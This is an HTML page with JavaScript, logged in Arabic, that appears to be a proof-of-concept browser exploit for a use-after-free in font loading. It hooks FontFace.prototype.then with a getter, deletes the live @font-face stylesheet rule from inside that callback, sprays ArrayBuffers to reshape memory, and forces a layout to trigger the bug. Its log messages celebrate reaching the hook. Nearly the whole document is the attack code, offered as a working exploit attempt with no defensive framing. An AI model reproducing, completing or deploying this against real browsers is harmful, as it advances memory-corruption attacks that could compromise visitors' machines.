<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url(nonexistent.woff); unicode-range: U+0042; }
    </style>
</head>
<body style="margin:0; padding:20px; font-family:monospace; background:black; color:white;">
    <div id="log" style="position:fixed; top:0; left:0; width:100%; height:100%; padding:20px; overflow:auto; white-space:pre-wrap;"></div>

<script>
    function log(m, color) {
        let el = document.createElement('div');
        el.innerHTML = "[LOG]: " + m;
        document.getElementById('log').appendChild(el);
        if (color) document.body.style.background = color;
    }

    window.onload = () => {
        log("1. بدء العمليات داخل onload...", "green");

        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(A);
        
        log("2. إعداد الـ Hook...", "yellow");
        
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                log("!!! تم الوصول للـ Getter (نجحنا!) !!!", "orange");
                
                try {
                    // حذف القاعدة
                    document.getElementById('s').sheet.deleteRule(0);
                    log("تم حذف القاعدة بنجاح.", "orange");
                    
                    // spray خفيف جداً لتجنب OOM
                    let spray = [];
                    for (let i = 0; i < 5; i++) { 
                        spray.push(new ArrayBuffer(0x1000));
                    }
                    log("تم رش الذاكرة (خفيف).", "purple");
                    
                    document.body.offsetTop; // Trigger
                } catch(err) {
                    log("ERROR: " + err.message, "red");
                }
                return undefined;
            }
        });

        log("3. تحميل الخط...", "yellow");
        document.fonts.load('1em x', 'AB');
    };
</script>
</body>
</html>
